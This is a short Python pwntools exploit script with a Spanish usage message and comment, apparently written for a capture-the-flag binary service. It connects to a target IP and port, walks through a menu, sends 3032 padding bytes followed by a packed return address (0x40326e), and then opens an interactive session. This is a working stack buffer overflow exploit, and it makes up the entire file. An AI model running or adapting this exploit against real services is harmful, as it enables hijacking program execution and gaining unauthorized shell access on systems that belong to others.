from pwn import *
import sys

if len(sys.argv) != 3:
    print("Usage: python script.py <IP> <PUERTO> ")
    sys.exit(1)

arg1 = sys.argv[1]
arg2 = sys.argv[2]


r = remote(arg1, int(arg2)) # Quiero que se reciba los argumentos por terminal

r.send("1\na\na\n")
r.send("2\na\na\n")
r.send("2\n")
a = "B"*3032
b = a + "\x6e\x32\x40\x00\n"

r.send(b)
r.interactive()

